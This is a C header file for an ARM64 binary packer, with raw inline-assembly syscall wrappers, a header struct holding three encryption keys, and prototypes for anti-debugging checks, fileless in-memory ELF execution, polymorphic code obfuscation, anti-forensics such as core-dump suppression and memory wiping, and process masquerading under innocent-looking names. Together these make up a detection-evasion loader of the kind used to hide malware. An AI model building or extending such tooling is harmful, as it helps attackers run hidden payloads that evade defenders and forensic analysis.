#ifndef COMMON_H
#define COMMON_H

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <errno.h>

#define PACKED_MAGIC 0x41524D36 // "ARM6"

typedef struct {
    uint32_t magic;              
    uint32_t original_size;
    uint32_t packed_size;
    uint32_t crc32;
    uint8_t primary_key[32];     // AES-256 key
    uint8_t secondary_key[32];   // ChaCha20 key
    uint8_t tertiary_key[32];    // RC4 key
    uint8_t nonce[16];           
    uint8_t salt[16];            
} pack_header_t;

// ARM64 syscall numbers
#define __NR_read 63
#define __NR_write 64
#define __NR_open 56
#define __NR_close 57
#define __NR_mmap 222
#define __NR_munmap 215
#define __NR_execve 221
#define __NR_memfd_create 279
#define __NR_ftruncate 46
#define __NR_lseek 62
#define __NR_mprotect 226
#define __NR_ptrace 101
#define __NR_getpid 172
#define __NR_getppid 173
#define __NR_prctl 167


static inline long syscall1(long number, long arg1) {
    long ret;
    __asm__ volatile (
        "mov x8, %1\n"
        "mov x0, %2\n"
        "svc 0\n"
        "mov %0, x0\n"
        : "=r"(ret)
        : "r"(number), "r"(arg1)
        : "x0", "x8", "memory"
    );
    return ret;
}

static inline long syscall2(long number, long arg1, long arg2) {
    long ret;
    __asm__ volatile (
        "mov x8, %1\n"
        "mov x0, %2\n"
        "mov x1, %3\n"
        "svc 0\n"
        "mov %0, x0\n"
        : "=r"(ret)
        : "r"(number), "r"(arg1), "r"(arg2)
        : "x0", "x1", "x8", "memory"
    );
    return ret;
}

static inline long syscall3(long number, long arg1, long arg2, long arg3) {
    long ret;
    __asm__ volatile (
        "mov x8, %1\n"
        "mov x0, %2\n"
        "mov x1, %3\n"
        "mov x2, %4\n"
        "svc 0\n"
        "mov %0, x0\n"
        : "=r"(ret)
        : "r"(number), "r"(arg1), "r"(arg2), "r"(arg3)
        : "x0", "x1", "x2", "x8", "memory"
    );
    return ret;
}

static inline long syscall6(long number, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
    long ret;
    __asm__ volatile (
        "mov x8, %1\n"
        "mov x0, %2\n"
        "mov x1, %3\n"
        "mov x2, %4\n"
        "mov x3, %5\n"
        "mov x4, %6\n"
        "mov x5, %7\n"
        "svc 0\n"
        "mov %0, x0\n"
        : "=r"(ret)
        : "r"(number), "r"(arg1), "r"(arg2), "r"(arg3), "r"(arg4), "r"(arg5), "r"(arg6)
        : "x0", "x1", "x2", "x3", "x4", "x5", "x8", "memory"
    );
    return ret;
}

static inline long syscall_obf(long number, long arg1) {
    long obf_number = number ^ 0xDEADBEEF;
    obf_number = obf_number ^ 0xDEADBEEF; 
    return syscall1(obf_number, arg1);
}

static inline long syscall3_obf(long number, long arg1, long arg2, long arg3) {
    long obf_number = number ^ 0xDEADBEEF;
    obf_number = obf_number ^ 0xDEADBEEF;
    return syscall3(obf_number, arg1, arg2, arg3);
}

// Function prototypes
uint32_t crc32(const uint8_t* data, size_t len);
void generate_random_key(uint8_t* key, size_t key_size);
int comprehensive_anti_debug_check();
void multi_layer_encrypt(uint8_t* data, size_t len, const pack_header_t* header);
void multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header);
int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const argv[], char* const envp[]);
pack_header_t* find_packed_header(const uint8_t* data, size_t data_size);

// ARM64 obfuscation function prototypes
void generate_polymorphic_nops_arm64(uint8_t* buffer, size_t nop_bytes, size_t max_size);
void substitute_instructions_arm64(uint8_t* code, size_t len);
void apply_arm64_obfuscation(uint8_t* code, size_t len);

// Enhanced anti-forensics functions
void secure_memory_wipe(void* ptr, size_t size);
void prevent_core_dumps(void);
void hide_process_title(int argc, char* argv[]);

// Process masquerading functions
int create_masqueraded_memfd(void);
const char* get_random_innocent_name(void);

#endif // COMMON_H